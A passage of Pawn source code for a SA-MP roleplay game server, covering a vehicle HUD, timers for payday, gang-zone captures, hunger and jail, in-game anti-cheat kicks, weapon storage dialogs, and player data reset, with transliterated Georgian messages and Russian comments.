 	    case 70..74: mes3 = "~y~IIIIIIIIII~b~IIIII";
 	    case 75..79: mes3 = "~y~IIIIIIIIIII~b~IIII";
 	    case 80..84: mes3 = "~y~IIIIIIIIIIII~b~III";
 	    case 85..90: mes3 = "~y~IIIIIIIIIIIII~b~II";
 	    case 91..100: mes3 = "~y~IIIIIIIIIIIIII~b~I";
 	    case 101..200: mes3 = "~y~IIIIIIIIIIIIIII";
 	}
 	if(gVehicles[vehicleid-1][vFuel] >= 95.0) mes4 = "~y~IIIIIIIIIIIIIII";
 	else if(gVehicles[vehicleid-1][vFuel] >= 90.0) mes4 = "~y~IIIIIIIIIIIIII~b~I";
 	else if(gVehicles[vehicleid-1][vFuel] >= 85.0) mes4 = "~y~IIIIIIIIIIIII~b~II";
 	else if(gVehicles[vehicleid-1][vFuel] >= 80.0) mes4 = "~y~IIIIIIIIIIII~b~III";
 	else if(gVehicles[vehicleid-1][vFuel] >= 75.0) mes4 = "~y~IIIIIIIIIII~b~IIII";
 	else if(gVehicles[vehicleid-1][vFuel] >= 70.0) mes4 = "~y~IIIIIIIIII~b~IIIII";
 	else if(gVehicles[vehicleid-1][vFuel] >= 65.0) mes4 = "~y~IIIIIIIII~b~IIIIII";
 	else if(gVehicles[vehicleid-1][vFuel] >= 60.0) mes4 = "~y~IIIIIIII~b~IIIIIII";
 	else if(gVehicles[vehicleid-1][vFuel] >= 55.0) mes4 = "~y~IIIIIII~b~IIIIIIII";
 	else if(gVehicles[vehicleid-1][vFuel] >= 50.0) mes4 = "~y~IIIIII~b~IIIIIIIII";
 	else if(gVehicles[vehicleid-1][vFuel] >= 45.0) mes4 = "~y~IIIII~b~IIIIIIIIII";
 	else if(gVehicles[vehicleid-1][vFuel] >= 35.0) mes4 = "~y~IIII~b~IIIIIIIIIII";
 	else if(gVehicles[vehicleid-1][vFuel] >= 25.0) mes4 = "~y~III~b~IIIIIIIIIIII";
 	else if(gVehicles[vehicleid-1][vFuel] >= 15.0) mes4 = "~y~II~b~IIIIIIIIIIIII";
 	else if(gVehicles[vehicleid-1][vFuel] >= 5.0) mes4 = "~y~I~b~IIIIIIIIIIIIII";
 	else if(gVehicles[vehicleid-1][vFuel] <= 0.0) mes4 = "~b~IIIIIIIIIIIIIII";
 	format(mes,sizeof(mes),"~n~           ~w~(~p~S~w~): %s~n~           ~w~(~p~F~w~): %s~n~            ~%c~LOCKED ~r~RADIO~n~",mes3,mes4,gVehicles[vehicleid-1][vLock] == 1 ? 'r':'g');
 	//format(mes,sizeof(mes),"         ~w~Mil: ~y~%.1f KM~n~         ~w~%03d MPH ( %s ~w~)~n~         ~w~Fuel: ~p~%.2fL~n~           ~%c~LOCK ~r~RADIO",gVehicles[vehicleid-1][vDrived],SpeedVehicle(playerid)/2,mes3,gVehicles[vehicleid-1][vFuel],gVehicles[vehicleid-1][vLock] == 1 ? 'r':'g');
 	//format(mes,sizeof(mes),"         Fuel: ~y~%.2fL~n~~w~         Speed: ~y~%03d MPH~n~~w~         Mileage: ~p~%.1fKM~n~~w~Car status: ~%c~LOCKED",gVehicles[vehicleid-1][vFuel],SpeedVehicle(playerid)/2,gVehicles[vehicleid-1][vDrived],gVehicles[vehicleid-1][vLock] == 1 ? 'r':'g');
	PlayerTextDrawSetString(playerid,gVehInfo[playerid],mes);
}
public MainTimer()
{
    for(new idxf=0, i=0; idxf<cvector_size(players); idxf++)
	{
		i = cvector_get(players, idxf);
		if(GetPVarInt(i,"Logined") == 0) continue;
		//if(GetPVarInt(i, "Proverka") == 1 && SpeedFVehicle(i) >= 2) SendClientMessage(i, 0x30D5C8FF, "Вы были кикнуты, в подозрении использования чит-программ. (#0045)"), NewKick(i);
		if(IsPlayerInAnyVehicle(i)) {
			if(GetPlayerState(i) == PLAYER_STATE_DRIVER && gTransport[GetVehicleModel(GetPlayerVehicleID(i))-400][trFuelable] != 0) UpdateCarInfo(i,GetPlayerVehicleID(i));
            if(IDVEH[i] != -1 && UseEnter[i] != true && IDVEH[i] != GetPlayerVehicleID(i)) Kick(i);
		}
		/*onCheckAirBrk(i);
		if(GetPVarInt(i, "AntiBreik") > 0) SetPVarInt(i, "AntiBreik", GetPVarInt(i, "AntiBreik") - 1);*/
		if(!pData[i][pAdmin])
		{
			new Float:x, Float:y, Float:z;
			GetPlayerPos(i,x,y,z);
			if(GetPVarInt(i,"TPFPPP") < gettime() && z < 950 && SpeedFVehicle(i) < 30) {
	            if(x > (pTemp[i][pX])+45.0 || x < (pTemp[i][pX])-45.0) SendClientMessage(i, 0xB85A1CFF, "Shen Gaikike Chetis Gamoyenebistvis. (#0037)"), NewKick(i);
			}
			if(!IsPlayerInAnyVehicle(i)) {
			    if(GetPlayerState(i) == 9) SendClientMessage(i, 0xB85A1CFF, "Shen Gaikike Chetis Gamoyenebistvis. (#0038)"), NewKick(i);
				if(SpeedFVehicle(i) / 2 > 50) SendClientMessage(i,0xB85A1CFF,"Shen Gaikike Chetis Gamoyenebistvis. (#0041)"), NewKick(i);
			}
			if(GetPlayerWeapon(i) == 4 || GetPlayerWeapon(i) == 9 || GetPlayerWeapon(i) == 16 || GetPlayerWeapon(i) == 18 ||
		    GetPlayerWeapon(i) == 26 || GetPlayerWeapon(i) == 27 || GetPlayerWeapon(i) == 32 || GetPlayerWeapon(i) == 37 ||
		    GetPlayerWeapon(i) == 38 || GetPlayerWeapon(i) == 35 || GetPlayerWeapon(i) == 36 || GetPlayerWeapon(i) == 39 ||
		    GetPlayerWeapon(i) == 44 || GetPlayerWeapon(i) == 45)
		    {
				SendClientMessage(i, 0xB85A1CFF, "Shen Gaikike Chetis Gamoyenebistvis. (#0015)");
				SetPlayerAmmo(i, GetPlayerWeapon(i), 0);
		  		NewKick(i);
		    }
		    if(GetPVarInt(i,"AbletoHP") == 0)
			{
				new Float:health, Float:armour;
				GetPlayerHealth(i,health);
				GetPlayerArmour(i,armour);
				if(pData[i][pHealth] < health) SetPlayerHealth(i,pData[i][pHealth]);
				else if(pData[i][pHealth] > health && health > 0.0) pData[i][pHealth] = floatround(health);
				if(pData[i][pArmour] < armour) SetPlayerArmour(i,pData[i][pArmour]);
				else if(pData[i][pArmour] > armour) pData[i][pArmour] = armour;
			}
			else SetPVarInt(i,"AbletoHP",0);
			pTemp[i][pX] = x;
		}
		SetPVarInt(i,"pAFK",GetPVarInt(i,"pAFK") + 1);
		if(GetPVarInt(i,"pAFK") >= 3)
		{
			format(mes,sizeof(mes),"AFK: {e32636}%d",GetPVarInt(i,"pAFK"));
			SetPlayerChatBubble(i,mes,0xBBBBBBFF,10.0,1600);
		}
	}
}
public MinuteTimer()
{
	//new time = GetTickCount();
    //for(new ik;ik<500;ik++)
    //{
    //}
	//printf("MinuteTimer %d (ms)", GetTickCount() - time);
	new h,m,s;
	gettime(h,m,s);
	if(gCurHour != h)
	{
		gCurHour = h;
		PayDay();
	}
	if(gGangRespawnCar > 0) gGangRespawnCar -= 1;
	if(captures > 0)
	{
	    new i = CaptFight;
		if(GZSafeTime[i] > 0) GZSafeTime[i] -= 100;
		else
		{
		    if(CountOnZone[GZInfo[i][gFrakVlad]] > CountOnZone[GZInfo[i][gNapad]])
			{
				SendFMes(GZInfo[i][gFrakVlad],0x00B953AA,"Tqven Sheinarchunet Kontroli Tqvens Teritoriaze");
				SendFMes(GZInfo[i][gNapad],0xC56565AA,"Tqven Ver Daamyaret Kontroli Axal Teritoriaze");
				CountOnZone[GZInfo[i][gFrakVlad]] = 0;
				CountOnZone[GZInfo[i][gNapad]] = 0;
			}
			else if(CountOnZone[GZInfo[i][gFrakVlad]] < CountOnZone[GZInfo[i][gNapad]])
			{
				CountOnZone[GZInfo[i][gFrakVlad]] = 0;
				CountOnZone[GZInfo[i][gNapad]] = 0;
				SendFMes(GZInfo[i][gNapad], 0x00B953AA,"Shen Daamyare Kontroli Axal Teritoriaze");
				SendFMes(GZInfo[i][gFrakVlad], 0xC56565AA,"Shen Dakarge Kontroli Shen Teritoriaze");
				GZInfo[i][gFrakVlad] = GZInfo[i][gNapad];
				GZInfo[i][gNapad] = 0;
			}
			else if(CountOnZone[GZInfo[i][gFrakVlad]] == CountOnZone[GZInfo[i][gNapad]])
			{
			    CountOnZone[GZInfo[i][gFrakVlad]] = 0;
				CountOnZone[GZInfo[i][gNapad]] = 0;
				SendFMes(GZInfo[i][gNapad], 0x00B953AA,"Shen Daamyare Kontroli Axal Teritoriaze");
				SendFMes(GZInfo[i][gFrakVlad], 0xC56565AA,"Shen Dakarge Kontroli Shen Teritoriaze");
				GZInfo[i][gFrakVlad] = GZInfo[i][gNapad];
				GZInfo[i][gNapad] = 0;
			}
			for(new idxf=0, y=0; idxf<cvector_size(players); idxf++)
			{
  				y = cvector_get(players, idxf);
				if(pData[y][pFraction] == GZInfo[i][gNapad] || pData[y][pFraction] == GZInfo[i][gFrakVlad])
				{
  					CaptureOn[y] = 0;
					PlayerTextDrawHide(y, CaptureTime[y]);
				}
			}
			captures = 0;
			ZoneOnBattle[i] = 0;
			GangZoneStopFlashForAll(GZInfo[i][gID]);
			GangZoneHideForAll(GZInfo[i][gID]);
			GangZoneShowForAll(GZInfo[i][gID],GetGangZoneColor(i));
			SaveGZ(i+1);
		}
	}
	for(new idxf=0, i=0; idxf<cvector_size(players); idxf++)
	{
		i = cvector_get(players, idxf);
		if(GetPVarInt(i,"Logined") == 0) continue;
		if(pData[i][pStamina] > 0) pData[i][pStamina] -= 1;
		if(pData[i][pPower] > 0) pData[i][pPower] -= 1;
		if(pData[i][pHunger] > 0) pData[i][pHunger] -= 5;
		else {
			if(GetPVarInt(i,"InHospital") != 1)	SetPlayerHealthEx(i,pData[i][pHealth]-3.0), SendClientMessage(i,CGRAY,"Tqven Dzalian Gshiat. (!)");
		}
		if(pData[i][pMut] > 0)
		{
			pData[i][pMut] -= 2;
			if(pData[i][pMut] < 1) SendClientMessage(i,CGREEN,"Tqven Mogexsnat Mute"), pData[i][pMut] = 0;
		}
		if(GetPVarInt(i,"InHospital") == 1)
		{
			if(pData[i][pHealth] < 100.0) SetPlayerHealthEx(i,pData[i][pHealth]+20.0);
		}
		if(GetPVarInt(i,"maska2") > 0)
		{
		    SetPVarInt(i, "maska2", GetPVarInt(i,"maska2") - 1);
		    if(GetPVarInt(i,"maska2") == 0)
		    {
			    if(pData[i][pFraction]) SetPlayerColor(i,gFractionColor[pData[i][pFraction] - 1]);
			    else SetPlayerColor(i,0xFFFFFF11);
			    SendClientMessage(i,CGREEN,"Moixseni Maska.");
		    }
		}
		if(pData[i][pJail])
		{
			pData[i][pJail]--;
			if(!pData[i][pJail])
			{
				if(pData[i][pPrison] == 10)
				{
					SendClientMessage(i,CGRAY,"Shen Moixade Sasjeli. Axla Tavisufali Xar."), pData[i][pPrison] = 0;
					SetPlayerPos(i,3419.0259,-678.9800,10.9660);
					SetPlayerVirtualWorld(i,0);
					SetPlayerInterior(i,0);
					TogglePlayerControllable(i,0);
					SetTimerEx("Unfreez",2000,false,"i",i);
					return true;
				}
			}
		}
		if(captures != 0)
		{
		    new ik = CaptFight;
			if(pData[i][pFraction] == GZInfo[ik][gNapad] || pData[i][pFraction] == GZInfo[ik][gFrakVlad])
			{
                format(mes,sizeof(mes),"Teritoriss Dapyrobamde Darcha: %s",Convert(GZSafeTime[ik]));
				SendClientMessage(i,CGREEN,mes);
			}
		}
	}
	return true;
}

public PlayerPlaySoundDelay(playerid,soundid)
{
	PlayerPlaySound(playerid,soundid,0.0,0.0,0.0);
	return true;
}

public OnUnoccupiedVehicleUpdate (vehicleid, playerid, passenger_seat)
{
	if(passenger_seat)
	{
		new Float:x, Float:y, Float:z;
		GetVehiclePos(vehicleid,x,y,z);
		if(GetFloatDifference(x,gVehicles[vehicleid-1][vX]) > 10.0 || GetFloatDifference(y,gVehicles[vehicleid-1][vY]) > 10.0)
		{
			gVehicles[vehicleid-1][vX] = x;
			gVehicles[vehicleid-1][vY] = y;
			gVehicles[vehicleid-1][vZ] = z;
			SetPVarInt(playerid,"pKick4",GetPVarInt(playerid,"pKick4") + 1);
   			if(!IsKicked(playerid) && GetPVarInt(playerid,"pKick4") == 4)
	  		{
				SendClientMessage(playerid, 0xB85A1CFF, "Shen Gaikike Chetis Gamoyenebistvis. (#0016)"), NewKick(playerid);
			}
		}
	}
}

forward SelectStoreGun(playerid);
public SelectStoreGun(playerid) SetPVarInt(playerid,"SelectStoreGun",1);
forward SetCameraBehindPlayerDelay(playerid);
public SetCameraBehindPlayerDelay(playerid) SetCameraBehindPlayer(playerid);
stock ShowGunList(playerid)
{
    new mes2[128];
	for(new i;i<=11;i++)
	{
		new gunid,ammo,storeslot;
		GetPlayerWeaponData(playerid,i,gunid,ammo);
		storeslot = GetStoreGunSlot(gunid);
		if(!gunid || !ammo || storeslot == -1) continue;
		if(gunid == 23 && GetPVarInt(playerid,"Tazer") > 0) continue;
		if(WeaponInfo[playerid][gunid] == false && gunid != 40 && gunid != 0 && gunid != 46) return SendClientMessage(playerid,0xB85A1CFF,"Shen Gaikike Chetis Gamoyenebistvis. (#0042)"), NewKick(playerid);
		new gunname[32];
		GetWeaponName(gunid,gunname,32);
		if(!i) format(mes2,sizeof(mes2),"%s [{"#cGREEN"}%d{"#cWHITE"}]",gunname,ammo);
		else format(mes2,sizeof(mes2),"%s\n%s [{"#cGREEN"}%d{"#cWHITE"}]",mes2,gunname,ammo);
	}
	if(!strlen(mes))
	{
		SendClientMessage(playerid,CGRAY,"Shen Argaq Iaragi");
		ShowPlayerDialog(playerid,dStore,2,"{"#cGREEN"}Karada: {ffffff}Amorcheva","1. Iaragis Ageba\n2. Iaragis Dadeba\n3. Iaragis Archeva\n4. Fuli Da Narkotikebi","NEXT","CLOSE");
		return true;
	}
	ShowPlayerDialog(playerid,dStorePut,2,"Karada",mes2,"Dadeba","CLOSE");
	return true;
}

forward ClearAnimationsDelay(playerid);
public ClearAnimationsDelay(playerid) ApplyAnimation(playerid,"ped","IDLE_chat",4.1,1,0,0,0,1,1);
forward CarryDelay(playerid);
public CarryDelay(playerid) ApplyAnimation(playerid,"CARRY","crry_prtial",4.0,1,1,1,1,1,1);
forward CloseBarrier(id);
public CloseBarrier(id)
{
	switch(id)
	{
		case 0: MoveDynamicObject(gBarrier[0],346.70, 1799.90, 18.00,0.01,0.00, 269.00,34.00);
		//case 1: MoveDynamicObject(gBarrier[1],141.80, 1965.30, 19.30,0.01,0.00, 269.99,0.00);
		case 2:
		{
			MoveDynamicObject(gBarrier[2],462.21, 2540.05, 19.01, 1.0);
			MoveDynamicObject(gBarrier[3],466.81, 2546.64, 19.01, 1.0);
		}
		//case 3: MoveDynamicObject(gBarrier[4],1544.69, -1630.72, 13.07,0.001,0.00, 90.00, 90.00);
		case 4: MoveDynamicObject(gBarrier[5],-1572.20, 658.76, 6.76,0.001,0.00, 90.00, 90.00);
		case 5: MoveDynamicObject(gBarrier[6],-1701.43, 687.70, 24.59,0.001,0.00, -90.00, 90.00);
		case 6: MoveDynamicObject(gBarrier[7],141.80, 1965.30, 19.30, 0.001,  0.00, 270.0, 0.00);//
		case 13:
		{
		    MoveDynamicObject(gBarrier[8], -1945.6964111,-1015.1713867,31.3134995, 2.0);
            fbida = 0;
		}
		case 14: MoveDynamicObject(gBarrier[9], 217.1933594,-398.0214844,999.5189819, 2.0);
		case 15: MoveDynamicObject(gBarrier[10], 130.9180756,-213.8379974,921.9600220, 2.0);
	}
}
forward ClearPhone(playerid);
public ClearPhone(playerid) RemovePlayerAttachedObject(playerid,0);
forward Unfreez2(playerid);
public Unfreez2(playerid)
{
	TogglePlayerControllable(playerid,1);
	ClearAnimations(playerid);
}
forward Unfreez(playerid);
public Unfreez(playerid)
{
	TogglePlayerControllable(playerid,1);
	ClearAnimations(playerid);
	if(GetPVarInt(playerid,"Tazer") > 0)
	{
		SetPVarInt(playerid,"Tazer",0);
		SetPlayerSpecialAction(playerid,SPECIAL_ACTION_NONE);
		return true;
	}
	/*new Float:x, Float:y, Float:z;
	GetPlayerPos(playerid,x,y,z);
	if(x > (pTemp[playerid][pX2])+40.0 || x < (pTemp[playerid][pX2])-40.0) {
		SendClientMessage(playerid,0xB85A1CFF,"Вы были кикнуты, в подозрении использования чит-программ. (#0043)");
		NewKick(playerid);
	}*/
	return true;
}
forward OnDetonate(Float:x,Float:y,Float:z,Float:x2,Float:y2,Float:z2);
public OnDetonate(Float:x,Float:y,Float:z,Float:x2,Float:y2,Float:z2) CreateExplosion(x,y,z,6,3.0);
forward AttachTrailerToVehicleEx(trailerid,vehicleid);
public AttachTrailerToVehicleEx(trailerid,vehicleid) AttachTrailerToVehicle(trailerid,vehicleid);
forward RemovePlayerAttachedObjectDelay(playerid,slot);
public RemovePlayerAttachedObjectDelay(playerid,slot) RemovePlayerAttachedObject(playerid,slot);
stock HideCarInfo(playerid)
{
	PlayerTextDrawHide(playerid,privcar[playerid]);
	PlayerTextDrawHide(playerid,gVehInfo[playerid]);
	return true;
}
stock ToggleEngine(vehicleid)
{
	new engine, lights, alarm, doors, bonnet, boot, objective;
    GetVehicleParamsEx(vehicleid, engine, lights, alarm, doors, bonnet, boot, objective);
    if(engine == 0) SetVehicleParamsEx(vehicleid, 1, lights, alarm, doors, bonnet, boot, objective);
    else SetVehicleParamsEx(vehicleid, 0, lights, alarm, doors, bonnet, boot, objective);
}
stock WHDataUpdate()
{
	new message1[180];
	format(message1,sizeof(message1),"Металла: {"#cGREEN"}%d\n{"#cWHITE"}Tyviebi: {"#cGREEN"}%d",gArmyWarehouse[0][0],gArmyWarehouse[0][1]);
	UpdateDynamic3DTextLabelText(gArmyWarehouseText[0],CWHITE,message1);
	format(message1,sizeof(message1),"Металла: {"#cGREEN"}%d\n{"#cWHITE"}Tyviebi: {"#cGREEN"}%d",gArmyWarehouse[1][0],gArmyWarehouse[1][1]);
	UpdateDynamic3DTextLabelText(gArmyWarehouseText[1],CWHITE,message1);
	format(message1,sizeof(message1),"Металла: {"#cGREEN"}%d\n{"#cWHITE"}Tyviebi: {"#cGREEN"}%d",gPDWarehouse[0][0],gPDWarehouse[0][1]);
	UpdateDynamic3DTextLabelText(gPDWarehouseText[0],CWHITE,message1);
	format(message1,sizeof(message1),"Металла: {"#cGREEN"}%d\n{"#cWHITE"}Tyviebi: {"#cGREEN"}%d",gPDWarehouse[1][0],gPDWarehouse[1][1]);
	UpdateDynamic3DTextLabelText(gPDWarehouseText[1],CWHITE,message1);
	format(message1,sizeof(message1),"Металла: {"#cGREEN"}%d\n{"#cWHITE"}Tyviebi: {"#cGREEN"}%d",gPDWarehouse[2][0],gPDWarehouse[2][1]);
	UpdateDynamic3DTextLabelText(gPDWarehouseText[2],CWHITE,message1);
	for(new i;i<5;i++)
	{
		format(message1,sizeof(message1),"{6E615D}Saerto\n\n{818520}Metali: {"#cWHITE"}%d\n{818520}Tyviebi: {"#cWHITE"}%d\n{818520}Medikamentebi: {"#cWHITE"}%d\n{818520}Fulis Raodenoba: {"#cWHITE"}%d$",gGangDorm[i][0],gGangDorm[i][1],gGangDorm[i][2],gGangDorm[i][3]);
		UpdateDynamic3DTextLabelText(gGangDormText[i],CWHITE,message1);
	}

}

stock SetPlayerDataToDefault(playerid)
{
	ShowPlayerDialog(playerid, -1, 0, "", "", "", "");
	pData[playerid][pMysqlID] = 0;
	strdel(Name2(playerid),0,MAX_PLAYER_NAME);
	strdel(pData[playerid][pPassword],0,MAX_PLAYER_NAME);
	strdel(pData[playerid][pDivorce],0,MAX_PLAYER_NAME);
	pData[playerid][pSex] = 0;
	pData[playerid][pWarn] = 0;
	pData[playerid][pBan] = 0;
	pData[playerid][pMut] = 0;
	pData[playerid][pAge] = 0;
	pData[playerid][pSkin] = 0;
	pData[playerid][pAdmin] = 0;
	pData[playerid][pHelper] = 0;
	pData[playerid][pFractionSkin] = 0;
	pData[playerid][pHealth] = 100;
	pData[playerid][pHouse] = 0;
	pData[playerid][pJob] = 0;
	pData[playerid][pCar] = 0;
	pData[playerid][pMoney] = 0;
	pData[playerid][pBank] = 0;
	pData[playerid][pLevel] = 1;
	pData[playerid][pExp] = 0;
	pData[playerid][pPhone] = 0;
	pData[playerid][pWanted] = 0;
	pData[playerid][pJail] = 0;
	pData[playerid][pPrison] = 0;
	pData[playerid][pGrain] = 0;
	pData[playerid][pDrugs] = 0;
	pData[playerid][pAmmo] = 0;
	pData[playerid][pGunAmount] = 0;
	pData[playerid][pFraction] = 0;
	pData[playerid][pSubfraction] = 0;
	pData[playerid][pRank] = 0;
	pData[playerid][pWatch] = 0;
	pData[playerid][pBusiness] = 0;
	pData[playerid][pLevel] = 0;
	strdel(pData[playerid][pCode],0,MAX_PLAYER_NAME);
	pData[playerid][pRequestCode] = 0;
	pData[playerid][pLicenses] = {0,0,0,0};
	pData[playerid][pStatus] = 0;
	pData[playerid][pDonate] = 0;
	pData[playerid][pVehicleKey] = 0;
	pData[playerid][pArmyTime] = 0;
	pData[playerid][pArmyRank] = 0;
	pData[playerid][pObraz1] = 0;
	pData[playerid][pObraz3] = 0;
	pData[playerid][pObraz4] = 0;
	pData[playerid][pBolnica] = 0;
	pData[playerid][pSpawn] = 0;
	pData[playerid][pOtel] = 0;
	pData[playerid][pOtelNomer] = 0;

	for(new i;i<13;i++) gGuns[playerid][i] = 0, gAmmos[playerid][i] = 0;
	for(new i;i<9;i++) pTemp[playerid][pEda][i] = 0;
	for(new i = 0; i < 47; i++) WeaponInfo[playerid][i] = false;

    pTemp[playerid][pShowLicpl] = -1;
	pTemp[playerid][pShowLicact] = -1;
	pTemp[playerid][pShowPasspl] = -1;
	pTemp[playerid][pShowPassact] = -1;
	pTemp[playerid][pShowSkillact] = -1;
	pTemp[playerid][pShowSkillpl] = -1;
	pTemp[playerid][pWorkSalary] = 0;
	pTemp[playerid][pTaxiID] = INVALID_VEHICLE_ID;
	pTemp[playerid][pTaxiPrice] = 0;
	pTemp[playerid][pTaxi3DText] = Text3D:INVALID_3DTEXT_ID;
	pTemp[playerid][pTaxiPass] = INVALID_PLAYER_ID;
	pTemp[playerid][pTaxiTurn][0] = INVALID_PLAYER_ID;
	pTemp[playerid][pTaxiTurn][1] = INVALID_PLAYER_ID;
	pTemp[playerid][pSelectedHouseID] = 0;
	pTemp[playerid][pSellHouseOffer] = INVALID_PLAYER_ID;
	pTemp[playerid][pSellHouseOffee] = INVALID_PLAYER_ID;
	pTemp[playerid][pSellHousePrice] = 0;
	pTemp[playerid][pSellHouseID] = 0;
	pTemp[playerid][pSettleHouseOffer] = INVALID_PLAYER_ID;
	pTemp[playerid][pSettleHouseOffee] = INVALID_PLAYER_ID;
	pTemp[playerid][pSettleHouseID] = 0;
	pTemp[playerid][pSellCarOffer] = INVALID_PLAYER_ID;
	pTemp[playerid][pSellCarOffee] = INVALID_PLAYER_ID;
	pTemp[playerid][pSellCarPrice] = 0;
	pTemp[playerid][pSellCarID] = 0;
	pTemp[playerid][pSellBusinessOffer] = INVALID_PLAYER_ID;
	pTemp[playerid][pSellBusinessOffer] = INVALID_PLAYER_ID;
	pTemp[playerid][pSellBusinessOffee] = INVALID_PLAYER_ID;
	pTemp[playerid][pSellBusinessPrice] = 0;
	pTemp[playerid][pSellBusinessID] = 0;
	pTemp[playerid][pFillingSpeed] = 0.0;
	pTemp[playerid][pFillingAccel] = 0.0;
	pTemp[playerid][pStoreGun] = 0;
	pTemp[playerid][pHealth] = 100.0;
	pTemp[playerid][pEat] = 0;
	pTemp[playerid][pTestQNumber] = 0;
	pTemp[playerid][pX] = 0.0;
	pTemp[playerid][pSpectatee] = INVALID_PLAYER_ID;
	pData[playerid][pArmour] = 0.0;
	pData[playerid][pHunger] = 0;
	pData[playerid][pStamina] = 0;
	pData[playerid][pPower] = 0;
	pTemp[playerid][pCaller] = INVALID_PLAYER_ID;
	pTemp[playerid][pCallee] = INVALID_PLAYER_ID;
	pTemp[playerid][pMechID] = INVALID_VEHICLE_ID;
	pTemp[playerid][pMechOffer] = INVALID_PLAYER_ID;
	pTemp[playerid][pMechOffee] = INVALID_PLAYER_ID;
	pTemp[playerid][pMechTrailer] = 0;
	pTemp[playerid][pCuffer] = INVALID_PLAYER_ID;
	pTemp[playerid][pCuffee] = INVALID_PLAYER_ID;
	pTemp[playerid][pSelectedBusinessID] = -1;

	strdel(pRegData[playerid][0],0,MAX_PLAYER_NAME);
	strdel(pRegData[playerid][1],0,MAX_PLAYER_NAME);
	strdel(pRegData[playerid][2],0,64);
	pRegData[playerid][3][0] = 0;
	WeddingTwo[playerid] = -1;

    //КАЗИНО
	RemoveBuildingForPlayer(playerid, 2188, 1125.1406, -3.4141, 1000.5781, 0.25);
	RemoveBuildingForPlayer(playerid, 2188, 1127.0781, -1.6797, 1000.5781, 0.25);
	RemoveBuildingForPlayer(playerid, 2188, 1125.1484, -0.0313, 1000.5781, 0.25);
	//Тюрьма
	RemoveBuildingForPlayer(playerid, 14584, 942.3203, 2145.5156, 1011.8203, 0.25);
	//Универ, надписи
	RemoveBuildingForPlayer(playerid, 14886, 268.4375, 186.9297, 1006.8828, 0.25);
	RemoveBuildingForPlayer(playerid, 14887, 228.3594, 167.5156, 1004.0703, 0.25);
	RemoveBuildingForPlayer(playerid, 14885, 244.6875, 166.6953, 1005.5781, 0.25);
	//У мафии батут
	RemoveBuildingForPlayer(playerid, 14449, 2567.6172, -1294.6328, 1061.2500, 0.25);
	//Магазин оружия
	RemoveBuildingForPlayer(playerid, 1885, 310.1250, -166.2109, 998.5547, 0.25);
	RemoveBuildingForPlayer(playerid, 1885, 315.2422, -169.8984, 998.5547, 0.25);
	RemoveBuildingForPlayer(playerid, 18105, 312.9844, -163.2500, 1000.5547, 0.25);
	RemoveBuildingForPlayer(playerid, 1886, 318.8047, -158.9297, 1003.2266, 0.25);
    //Other
	RemoveBuildingForPlayer(playerid, 3345, 400.1172, 2543.5703, 15.4844, 0.25);
	RemoveBuildingForPlayer(playerid, 3367, 149.9141, 2614.6172, 15.4766, 0.25);
	RemoveBuildingForPlayer(playerid, 3368, 161.7891, 2411.3828, 15.4766, 0.25);
	RemoveBuildingForPlayer(playerid, 3369, 123.0469, 2587.7422, 15.4766, 0.25);
	RemoveBuildingForPlayer(playerid, 3368, 311.1328, 2614.6172, 15.4766, 0.25);
	RemoveBuildingForPlayer(playerid, 3368, 176.7891, 2587.7422, 15.4766, 0.25);
	RemoveBuildingForPlayer(playerid, 3368, 338.0078, 2587.7422, 15.4766, 0.25);
	RemoveBuildingForPlayer(playerid, 3368, 323.0078, 2411.3828, 15.4766, 0.25);
	RemoveBuildingForPlayer(playerid, 3369, 203.6563, 2614.6172, 15.4766, 0.25);
	RemoveBuildingForPlayer(playerid, 3369, 230.5234, 2641.4844, 15.4766, 0.25);
	RemoveBuildingForPlayer(playerid, 3369, 349.8750, 2438.2500, 15.4766, 0.25);
	RemoveBuildingForPlayer(playerid, 3369, 269.2656, 2411.3828, 15.4766, 0.25);
	RemoveBuildingForPlayer(playerid, 3369, 242.3984, 2438.2500, 15.4766, 0.25);
	RemoveBuildingForPlayer(playerid, 3369, 188.6563, 2438.2500, 15.4766, 0.25);
	RemoveBuildingForPlayer(playerid, 3369, 108.0469, 2411.3828, 15.4766, 0.25);
	RemoveBuildingForPlayer(playerid, 3367, 176.7891, 2641.4844, 15.4766, 0.25);
	RemoveBuildingForPlayer(playerid, 3367, 230.5234, 2587.7422, 15.4766, 0.25);
	RemoveBuildingForPlayer(playerid, 3367, 257.3984, 2614.6172, 15.4766, 0.25);
	RemoveBuildingForPlayer(playerid, 3367, 284.2656, 2641.4844, 15.4766, 0.25);
	RemoveBuildingForPlayer(playerid, 3367, 284.2656, 2587.7422, 15.4766, 0.25);
	RemoveBuildingForPlayer(playerid, 3367, 296.1406, 2438.2500, 15.4766, 0.25);
	RemoveBuildingForPlayer(playerid, 3367, 215.5313, 2411.3828, 15.4766, 0.25);
	RemoveBuildingForPlayer(playerid, 3367, 134.9141, 2438.2500, 15.4766, 0.25);
	RemoveBuildingForPlayer(playerid, 16595, 419.3750, 2538.5000, 15.5391, 0.25);
	RemoveBuildingForPlayer(playerid, 16596, 412.8281, 2542.8672, 15.5391, 0.25);
	RemoveBuildingForPlayer(playerid, 16597, 437.3828, 2547.5156, 15.1484, 0.25);
	RemoveBuildingForPlayer(playerid, 16598, 231.2813, 2545.7969, 20.0234, 0.25);
	RemoveBuildingForPlayer(playerid, 3296, 255.9844, 2549.3281, 20.2031, 0.25);
	RemoveBuildingForPlayer(playerid, 3295, 392.7109, 2596.4531, 17.6328, 0.25);
	RemoveBuildingForPlayer(playerid, 3296, 376.2969, 2606.3438, 20.1719, 0.25);
	RemoveBuildingForPlayer(playerid, 3295, 390.8203, 2604.0703, 20.0234, 0.25);
	RemoveBuildingForPlayer(playerid, 3295, 389.1328, 2611.0625, 20.1719, 0.25);
	RemoveBuildingForPlayer(playerid, 3295, 382.1875, 2609.4766, 19.8203, 0.25);
	RemoveBuildingForPlayer(playerid, 16600, 435.6250, 2532.0859, 20.1797, 0.25);
	RemoveBuildingForPlayer(playerid, 16602, 307.9531, 2543.4531, 20.3984, 0.25);
	RemoveBuildingForPlayer(playerid, 16772, 404.7969, 2454.7188, 22.0547, 0.25);
	RemoveBuildingForPlayer(playerid, 3269, 108.0469, 2411.3828, 15.4766, 0.25);
	RemoveBuildingForPlayer(playerid, 3270, 161.7891, 2411.3828, 15.4766, 0.25);
	RemoveBuildingForPlayer(playerid, 3364, 77.3203, 2456.2500, 15.2813, 0.25);
	RemoveBuildingForPlayer(playerid, 3269, 188.6563, 2438.2500, 15.4766, 0.25);
	RemoveBuildingForPlayer(playerid, 3271, 134.9141, 2438.2500, 15.4766, 0.25);
	RemoveBuildingForPlayer(playerid, 3271, 215.5313, 2411.3828, 15.4766, 0.25);
